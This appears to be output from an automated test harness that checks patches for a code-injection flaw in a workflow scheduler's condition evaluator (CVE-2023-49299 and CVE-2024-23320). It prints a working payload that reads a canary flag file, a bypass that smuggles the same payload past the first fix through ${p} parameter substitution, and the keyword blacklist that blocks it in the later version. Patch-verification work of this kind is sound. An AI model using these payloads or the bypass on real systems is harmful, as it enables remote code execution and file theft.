AUTOMATED GATE  (python3 oracle.py --run-gate --with-v2)
Probes are EXTERNAL HTTP POST /eval {condition,params} via urllib to 127.0.0.1:<port>.
flag = PCBFLAG_a37e86785601a20c4e9636733edd84e8
-------------------------------------------------------------------------
  original_poc_reaches_flag_on_v0 : true     (v0: guard_present=false, evaluated=true, stdout="PCBOUT:<flag>")
  original_poc_blocked_on_v1      : true     (v1: guard_present=true,  blocked=true, IllegalArgumentException "condition is not valid" -> no-substitution guard)
  bypass_poc_reaches_flag_on_v1   : true     (v1: guard_present=true,  blocked=false, evaluated=true, stdout="PCBOUT:<flag>")
  passed                          : true
  _residual_blocked_on_v2         : true     (v2: guard_present=true,  blocked=true, IllegalArgumentException "condition is not valid" -> keyword blacklist)

ORIGINAL (CVE-2023-49299 seed, NO ${param} substitution):
  condition = java.lang.System.out.println('PCBOUT:'+new java.lang.String(
              java.nio.file.Files.readAllBytes(java.nio.file.Paths.get("/canary/flag.txt"))));true
  params    = {"unused":"1"}   (dummy, UNREFERENCED -> substitution runs but changes nothing
                                -> V1 block is specifically the no-substitution guard)
  V0 -> flag echoed (REACHES).  V1 -> IllegalArgumentException (BLOCKED before eval).

RESIDUAL (CVE-2024-23320, benign ${p} substitution carries the same arbitrary JS):
  condition = java.lang.System.out.println('PCBOUT:'+new java.lang.String(
              java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(${p}))));true
  params    = {"p":"/canary/flag.txt"}
  The DS ${...} regex wraps the substituted value in "..." -> ${p} becomes "/canary/flag.txt",
  a valid JS string literal, and a substitution DID happen -> V1 no-substitution guard PASSES.
  V1 -> flag echoed (REACHES).  V2 -> IllegalArgumentException (keyword blacklist: "java"/"new") (BLOCKED).

